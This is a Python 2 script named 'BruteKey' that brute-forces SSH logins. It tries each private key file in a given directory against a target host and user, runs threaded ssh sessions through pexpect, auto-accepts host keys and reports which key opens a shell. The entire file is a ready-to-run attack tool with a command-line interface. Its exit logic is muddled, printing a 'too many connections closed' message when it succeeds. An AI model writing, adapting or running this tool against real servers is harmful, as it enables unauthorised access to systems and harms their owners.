#-*- coding:utf-8 -*-
#---------date:2018.06.06--------
#---------author:Gyl------------
#---------BruteKey------------

import os
import optparse
import pexpect
from threading import *

maxConnections = 5
connection_lcok = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0 
# check fails times

def connect(user,host,keyfile,release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh '+user + '@'+ host + ' -i '+keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#',])
        if ret == 2:
            print '[-] adding Host to !/.ssh/known_hosts'
            child.sendline('yes')
            connect(user,host,keyfile,False)
        elif ret == 3:
            print '[-] conneciton closed by remote Host'
            Fails += 1
        elif ret>3:
            print '[+] success. '+str(keyfile)
            Stop = True
    finally:
        if release:
            connection_lcok.release()
def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -d <directory>')
    parser.add_option('-H', dest = 'tgtHost',type = 'string',help='specify target host')
    parser.add_option('-u', dest = 'user',type = 'string',help='specify the user')
    parser.add_option('-d', dest = 'passDir',type = 'string',help='specify directory key')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None:
        print parser.usage
        exit(0)
    for filename in os.listdir(passDir):
        if Stop:
            print '[*] exiting: too many connections closed By remote Host'
            print '[!] adjust number of simultaneous threads.'
            exit(0)
        connection_lcok.acquire()
        fullpath = os.path.join(passDir,filename)
        print '[-] testing keyfile '+ str(fullpath)
        t = Thread(target=connect,args=(user,host,fullpath,True))
        child = t.start()

if __name__ == '__main__':
    main()